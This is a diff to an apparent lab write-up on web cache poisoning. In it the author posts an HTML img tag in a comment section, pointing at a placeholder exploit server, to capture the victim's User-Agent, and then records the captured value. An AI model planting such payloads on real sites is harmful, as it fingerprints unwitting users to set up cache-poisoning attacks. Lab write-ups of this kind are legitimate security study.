@@ -26,4 +26,11 @@ So now I found a way to inject my payload to cache and also I can manipulate who
 
 Now I need to know, which User-Agent my victim uses. 
 So in comment section I leave this payload to catch victim's browser in the log.
-`<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`
+`<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/fee" />`
+
+<img width="1846" height="185" alt="image" src="https://github.com/user-attachments/assets/bdffea7c-cf6f-4520-9179-9c30c01dc72a" />
+
+I can see, that user agent of the victim is: `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36`
+
+<img width="1560" height="563" alt="image" src="https://github.com/user-attachments/assets/a7ac9688-5f09-461f-85d7-8b5c0df8b102" />
+
